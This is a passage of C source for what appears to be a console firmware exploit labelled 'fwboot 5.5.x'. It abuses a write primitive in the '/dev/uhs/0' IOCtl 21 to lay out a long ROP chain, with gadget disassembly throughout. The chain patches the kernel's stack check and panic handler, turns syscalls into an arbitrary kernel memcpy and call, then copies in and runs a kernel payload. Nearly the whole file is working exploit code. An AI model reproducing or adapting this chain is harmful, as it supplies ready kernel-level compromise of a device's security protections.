	ioctl_21(uhs_heap_addr + 0x24D18, 0xDEADC0DE, in_buf, out_buf);						// R5
	ioctl_21(uhs_heap_addr + 0x24D1C, thread_stack_addr, in_buf, out_buf);				// R6 -> Contains R2 (thread_stack_addr)
	ioctl_21(uhs_heap_addr + 0x24D20, 0x104C0000, in_buf, out_buf);						// R7 -> Pointer to next PC at 0x1C(R7)
	ioctl_21(uhs_heap_addr + 0x24D24, 0x104C0100, in_buf, out_buf);						// R8 -> Pointer to R3 at 0x0C(R8)
	ioctl_21(uhs_heap_addr + 0x24D28, 0x1011C794, in_buf, out_buf);						// PC
	
	// Gadget #2
	/*
		LOAD:1011C794                 MOV             R2, R6
		LOAD:1011C798                 MOV             R0, R8
		LOAD:1011C79C                 MOV             R1, R5
		LOAD:1011C7A0                 MOV             R3, SP
		LOAD:1011C7A4                 MOV             LR, PC
		LOAD:1011C7A8                 LDR             PC, [R7,#0x1C]
	*/
	
	// Gadget #3
	/*
		LOAD:101034C8                 CMP             R0, #0
		LOAD:101034CC                 MOV             R3, R0
		LOAD:101034D0                 LDRNE           R3, [R0,#0xC]
		LOAD:101034D4                 MOV             R0, R3
		LOAD:101034D8                 LDR             PC, [SP],#4
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D2C, 0x1010ED00, in_buf, out_buf);						// PC
	
	// Gadget #4
	/*
		LOAD:1010ED00                 ADD             SP, SP, #0x14
		LOAD:1010ED04                 LDMFD           SP!, {R4-R7,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D40, 0xDEADC0DE, in_buf, out_buf);						// Can't be NULL
	
	ioctl_21(uhs_heap_addr + 0x24D44, 0x104C0200, in_buf, out_buf);						// R4 -> Pointer to R0
	ioctl_21(uhs_heap_addr + 0x24D48, thread_args, in_buf, out_buf);					// R5 -> Contains R1 (thread_args)
	ioctl_21(uhs_heap_addr + 0x24D4C, 0x104C0300, in_buf, out_buf);						// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_heap_addr + 0x24D50, 0xDEADC0DE, in_buf, out_buf);						// R7
	ioctl_21(uhs_heap_addr + 0x24D54, 0x101035F8, in_buf, out_buf);						// PC
	
	// Gadget #5
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D58, thread_priority, in_buf, out_buf);				// R4 -> Stack arg (thread_priority)
	ioctl_21(uhs_heap_addr + 0x24D5C, thread_flags, in_buf, out_buf);					// R5 -> Stack arg (thread_flags)
	ioctl_21(uhs_heap_addr + 0x24D60, 0x104C0400, in_buf, out_buf);						// R6 -> Pointer to store return value
	ioctl_21(uhs_heap_addr + 0x24D64, 0x1010FF3C, in_buf, out_buf);						// PC
	
	
	// Gadget #6
	/*
		LOAD:1010FF3C                 STR             R0, [R6]
		LOAD:1010FF40                 MOV             R0, R2
		LOAD:1010FF44                 ADD             SP, SP, #0x18
		LOAD:1010FF48                 LDMFD           SP!, {R4-R7,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D80, 0xDEADC0DE, in_buf, out_buf);						// R4
	ioctl_21(uhs_heap_addr + 0x24D84, 0x104C0500, in_buf, out_buf);						// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_heap_addr + 0x24D88, 0xDEADC0DE, in_buf, out_buf);						// R6
	ioctl_21(uhs_heap_addr + 0x24D8C, 0xDEADC0DE, in_buf, out_buf);						// R7
	ioctl_21(uhs_heap_addr + 0x24D90, 0x10121074, in_buf, out_buf);						// PC
	
	
	/*
	
		Call kern_write and patch SP check
		This will place a branch in the syscall handler
		to bypass checking the thread's SP
	
	*/
	
	
	// Gadget #7
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D94, 0x104C0700, in_buf, out_buf);						// R4 -> Can't be NULL
	ioctl_21(uhs_heap_addr + 0x24D98, kern_write_spcp_data, in_buf, out_buf);			// R5 -> Contains R1 (kern_write_spcp_data)
	ioctl_21(uhs_heap_addr + 0x24D9C, 0x104C0600, in_buf, out_buf);						// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_heap_addr + 0x24DA0, 0x101035F8, in_buf, out_buf);						// PC
	
	// Gadget #8
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24DA4, 0xDEADC0DE, in_buf, out_buf);						// R4
	ioctl_21(uhs_heap_addr + 0x24DA8, 0x104C0800, in_buf, out_buf);						// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_heap_addr + 0x24DAC, 0xDEADC0DE, in_buf, out_buf);						// R6
	ioctl_21(uhs_heap_addr + 0x24DB0, 0x10121074, in_buf, out_buf);						// PC
	
	
	/*
	
		Call kern_write and change SP
		This will move the SP into a safe place to 
		continue executing the chain
		
	*/
	
	
	// Gadget #9
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24DB4, 0x104C0A00, in_buf, out_buf);						// R4 -> Can't be NULL
	ioctl_21(uhs_heap_addr + 0x24DB8, kern_write_spmov_data, in_buf, out_buf);			// R5 -> Contains R1 (kern_write_spmov_data)
	ioctl_21(uhs_heap_addr + 0x24DBC, 0x104C0900, in_buf, out_buf);						// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_heap_addr + 0x24DC0, 0x101035F8, in_buf, out_buf);						// PC
	
	// Gadget #10
	// NOTE: The thread's SP will have moved here
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00004, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00008, 0x104C0B00, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x0000C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00010, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_write to patch iosPanic
		This will prevent crashing in case of bad memory accesses
		
	*/
	
	
	// Gadget #11
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/

	ioctl_21(uhs_rop_chain_addr + 0x00014, 0x104C0D00, in_buf, out_buf);				// R4 -> Can't be NULL
	ioctl_21(uhs_rop_chain_addr + 0x00018, kern_write_panic_data, in_buf, out_buf);		// R5 -> Contains R1 (kern_write_panic_data)
	ioctl_21(uhs_rop_chain_addr + 0x0001C, 0x104C0C00, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x00020, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #12
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00024, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00028, 0x104C0E00, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x0002C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00030, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_write and install kern_memcpy
		This will turn syscall 0x81 into an arbitrary kernel level memcpy
		
	*/
	
	
	// Gadget #13
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/

	ioctl_21(uhs_rop_chain_addr + 0x00034, 0x104C1000, in_buf, out_buf);				// R4 -> Can't be NULL
	ioctl_21(uhs_rop_chain_addr + 0x00038, kern_write_inst_data, in_buf, out_buf);		// R5 -> Contains R1 (kern_write_inst_data)
	ioctl_21(uhs_rop_chain_addr + 0x0003C, 0x104C0F00, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x00040, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #14
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00044, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00048, 0x104C1100, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x0004C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00050, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_memcpy
		This will patch the damage caused by IOS_CreateThread in the kernel
	
	*/
	
	
	// Gadget #15
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00054, 0x104C1300, in_buf, out_buf);				// R4 -> Pointer to R0
	ioctl_21(uhs_rop_chain_addr + 0x00058, kern_memcpy_patch_src, in_buf, out_buf);		// R5 -> Contains R1 (kern_memcpy_patch_src)
	ioctl_21(uhs_rop_chain_addr + 0x0005C, 0x104C1200, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x00060, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #16
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00064, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00068, 0x104C1400, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x0006C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00070, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_memcpy again
		This will copy our payload into the kernel's code region
	
	*/
	
	
	// Gadget #17
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00074, 0x104C1600, in_buf, out_buf);				// R4 -> Pointer to R0
	ioctl_21(uhs_rop_chain_addr + 0x00078, kern_memcpy_payload_src, in_buf, out_buf);	// R5 -> Contains R1 (kern_memcpy_payload_src)
	ioctl_21(uhs_rop_chain_addr + 0x0007C, 0x104C1500, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x00080, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #18
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00084, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00088, 0x104C1700, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x0008C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00090, 0x10121074, in_buf, out_buf);				// PC
	

	/*
	
		Call kern_write and install pointer to kernel code
		This will turn syscall 0x6F into a pointer to our kernel code
		
	*/
	
	
	// Gadget #19
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/

	ioctl_21(uhs_rop_chain_addr + 0x00094, 0x104C1900, in_buf, out_buf);				// R4 -> Can't be NULL
	ioctl_21(uhs_rop_chain_addr + 0x00098, kern_write_call_data, in_buf, out_buf);		// R5 -> Contains R1 (kern_write_call_data)
	ioctl_21(uhs_rop_chain_addr + 0x0009C, 0x104C1800, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x000A0, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #20
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000A4, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x000A8, 0x104C1A00, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x000AC, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x000B0, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_call
		This will execute our crafted kernel code
	
	*/
	
	
	// Gadget #21
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000B4, 0x104C1C00, in_buf, out_buf);				// R4 -> Pointer to R0
	ioctl_21(uhs_rop_chain_addr + 0x000B8, kern_call_arg1, in_buf, out_buf);			// R5 -> Contains R1 (kern_call_arg1)
	ioctl_21(uhs_rop_chain_addr + 0x000BC, 0x104C1B00, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x000C0, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #22
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000C4, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x000C8, 0x104C1D00, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x000CC, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x000D0, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_write and patch LR
		This will patch our thread's LR address
	
	*/
	
	
	// Gadget #23
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000D4, 0x104C1F00, in_buf, out_buf);				// R4 -> Can't be NULL
	ioctl_21(uhs_rop_chain_addr + 0x000D8, kern_write_lrp_data, in_buf, out_buf);		// R5 -> Contains R1 (kern_write_lrp_data)
	ioctl_21(uhs_rop_chain_addr + 0x000DC, 0x104C1E00, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x000E0, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #24
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000E4, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x000E8, 0x104C2000, in_buf, out_buf);				// R5 -> Pointer to R2 at 0x24(R5)
	ioctl_21(uhs_rop_chain_addr + 0x000EC, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x000F0, 0x10121074, in_buf, out_buf);				// PC
	
	
	/*
	
		Call kern_write and patch SP
		This will patch our thread's SP back to it's original value
	
	*/
	
	
	// Gadget #25
	/*
		LOAD:10121074                 LDR             R2, [R5,#0x24]
		LOAD:10121078                 LDR             R3, =0xFFDEFFC5
		LOAD:1012107C                 MOV             R0, R4
		LOAD:10121080                 CMP             R2, R3
		LOAD:10121084                 LDMNEFD         SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x000F4, 0x104C2200, in_buf, out_buf);				// R4 -> Can't be NULL
	ioctl_21(uhs_rop_chain_addr + 0x000F8, kern_write_spp_data, in_buf, out_buf);		// R5 -> Contains R1 (kern_write_spp_data)
	ioctl_21(uhs_rop_chain_addr + 0x000FC, 0x104C2100, in_buf, out_buf);				// R6 -> Pointer to next PC at 0x24(R6)
	ioctl_21(uhs_rop_chain_addr + 0x00100, 0x101035F8, in_buf, out_buf);				// PC
	
	// Gadget #26
	/*
		LOAD:101035F8                 LDR             R0, [R4]
		LOAD:101035FC                 MOV             R1, R5
		LOAD:10103600                 MOV             LR, PC
		LOAD:10103604                 LDR             PC, [R6,#0x24]
		LOAD:10103608                 LDMFD           SP!, {R4-R6,PC}
	*/
	
	ioctl_21(uhs_rop_chain_addr + 0x00104, 0xDEADC0DE, in_buf, out_buf);				// R4
	ioctl_21(uhs_rop_chain_addr + 0x00108, 0xDEADC0DE, in_buf, out_buf);				// R5
	ioctl_21(uhs_rop_chain_addr + 0x0010C, 0xDEADC0DE, in_buf, out_buf);				// R6
	ioctl_21(uhs_rop_chain_addr + 0x00110, 0x101112D8, in_buf, out_buf);				// PC
	
	
	// Stack pivot
	ioctl_21(uhs_heap_addr + 0x24CE0, 0x1010EFA0, in_buf, out_buf);
}

// Call the vulnerable "/dev/uhs/0" IOCtl 21 (0x15)
void ioctl_21(uint32_t write_addr, uint32_t write_data, uint32_t *in_buf, uint32_t *out_buf)
{
	// Get a handle to coreinit.rpl
	unsigned int coreinit_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);

	// Memory functions
	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
	void* (*OSAllocFromSystem)(uint32_t size, int align);
	void (*OSFreeToSystem)(void *ptr);
	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
	
	// IOS functions
	int (*IOS_Open)(unsigned char *path, int mode);
	int (*IOS_Close)(int fd);
	int (*IOS_Ioctl)(int fd, int request, void *inbuf, int inlen, void *outbuf, int outlen);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Open", &IOS_Open);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Close", &IOS_Close);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Ioctl", &IOS_Ioctl);
	
	// Open "/dev/uhs/0"
	int dev_handle = IOS_Open("/dev/uhs/0", 0);
	
	// IOS-USB context variables
	uint32_t uhs_heap_addr = 0x10146060;
	uint32_t uhs_thread_stack_addr = uhs_heap_addr + 0x39EC;
	uint32_t uhs_root_hub_struct_size = 0x144;
	
	// Allocate root hub buffers
	uint32_t *root_hub_buf1 = (uint32_t*)OSAllocFromSystem(0x1000, 0x04);
	uint32_t *root_hub_buf2 = (uint32_t*)OSAllocFromSystem(0x1000, 0x04);
	memset(root_hub_buf1, 0, 0x1000);
	memset(root_hub_buf2, 0, 0x1000);

	// Prepare our userspace buffer
	out_buf[(0xBC + 0x84)/4] = OSEffectiveToPhysical(root_hub_buf1);	// Pointer to next root hub structure
	out_buf[(0xBC + 0xC0)/4] = 0x00000000;
	out_buf[(0xBC + 0x138)/4] = 0x00000000;								// If not 0, throws error 0xFFDEFFEE
	
	// Prepare our first root hub buffer
	root_hub_buf1[0x20/4] = OSEffectiveToPhysical(root_hub_buf2);		// Pointer to next root hub structure
		
	// Prepare our second root hub buffer
	root_hub_buf2[0x14/4] = 0x00000001;									// Should be different than 0
	root_hub_buf2[0x84/4] = 0x00000000;									
	root_hub_buf2[0x820/4] = (write_addr - 0x18);						// Pointer to write_addr + 0x18
	
	// Approximate an offset value that points to our buffer
	uint32_t write_offset = (OSEffectiveToPhysical(out_buf) + (uhs_root_hub_struct_size - 1) - uhs_thread_stack_addr) / uhs_root_hub_struct_size;
	
	// Text buffer
	char str_buf[0x400];
	
	// Send the IOCtl more than once (ensures data is cached)
	for (int i = 0; i < 2; i++)
	{	
		// Send the command
		// We should get 0xFFDEFFC7 as result
		in_buf[0] = 0x80000000 | write_offset;
		in_buf[1] = write_data;
		int result = IOS_Ioctl(dev_handle, 0x15, in_buf, 0x08, 0, 0);
		
		// Print progress
		__os_snprintf(str_buf, 0x400, "****fwboot 5.5.x****\nCalling UHS IOCtl 21 0x%08x\nin_buf: 0x%08x\nout_buf: 0x%08x\nroot_hub_buf1: 0x%08x\nroot_hub_buf2: 0x%08x\nresult: 0x%08x", (0x01010101 << (i * 4)), in_buf, out_buf, root_hub_buf1, root_hub_buf2, result);
		render(str_buf);			
	}
	
	// Free the root hub buffers
	OSFreeToSystem(root_hub_buf1);
	OSFreeToSystem(root_hub_buf2);
	
	// Close "/dev/uhs/0"
	IOS_Close(dev_handle);
}

/*
// Call the vulnerable "/dev/uhs/0" IOCtl 20 (0x14)
void ioctl_20(uint32_t write_addr)
{
	// Get a handle to coreinit.rpl
	unsigned int coreinit_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);

	// Memory functions
	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
	void* (*OSAllocFromSystem)(uint32_t size, int align);
	void (*OSFreeToSystem)(void *ptr);
	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
	
	// IOS functions
	int (*IOS_Open)(unsigned char *path, int mode);
	int (*IOS_Close)(int fd);
	int (*IOS_Ioctl)(int fd, int request, void *inbuf, int inlen, void *outbuf, int outlen);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Open", &IOS_Open);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Close", &IOS_Close);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Ioctl", &IOS_Ioctl);
	
	// Open "/dev/uhs/0"
	int dev_handle = IOS_Open("/dev/uhs/0", 0);
	
	// IOS-USB context variables
	uint32_t uhs_heap_addr = 0x10146060;
	uint32_t uhs_thread_stack_addr = uhs_heap_addr + 0x39EC;
	uint32_t uhs_root_hub_struct_size = 0x144;
	
	// Allocate an input buffer
	uint32_t *in_buf = (uint32_t*)OSAllocFromSystem(0x1000, 0x04);
	memset(in_buf, 0, 0x1000);
	
	// Approximate an offset value that points to our buffer
	uint32_t write_offset = (OSEffectiveToPhysical(write_addr) + (uhs_root_hub_struct_size - 1) - uhs_thread_stack_addr) / uhs_root_hub_struct_size;
		
	// Text buffer
	char str_buf[0x400];
	
	// Send the IOCtl more than once (ensures data is cached)
	for (int i = 0; i < 2; i++)
	{	
		// Send the command
		// We should get 0xFFDEFFC7 as result		
		in_buf[0] = 0x80000000 | write_offset;
		int result = IOS_Ioctl(dev_handle, 0x14, in_buf, 0x04, 0, 0);
	
		// Print progress
		__os_snprintf(str_buf, 0x400, "****fwboot 5.5.x****\nCalling UHS IOCtl 20 0x%08x\nin_buf: 0x%08x\nwrite_offset: 0x%08x\nresult: 0x%08x", (0x01010101 << (i * 4)), in_buf, write_offset, result);
		render(str_buf);
	}
	
	// Free the allocated buffer
	OSFreeToSystem(in_buf);
	
	// Close /dev/uhs/0
	IOS_Close(dev_handle);
}
*/

// Screen rendering
void render(char *str_buf)
{
	int i = 0;
	for (i; i < 2; i++)
	{
		fillScreen(0, 0, 0, 0);
		drawString(0, 0, str_buf);
		flipBuffers();
	}
}

// Simple memcmp() implementation
int memcmp(void *ptr1, void *ptr2, uint32_t length)
{
	uint8_t *check1 = (uint8_t*) ptr1;
	uint8_t *check2 = (uint8_t*) ptr2;
	uint32_t i;
	for (i = 0; i < length; i++)
	{
		if (check1[i] != check2[i]) return 1;
	}

	return 0;
}

// Simple memcpy() implementation
void* memcpy(void* dst, const void* src, uint32_t size)
{
	uint32_t i;
	for (i = 0; i < size; i++)
		((uint8_t*) dst)[i] = ((const uint8_t*) src)[i];
	return dst;
}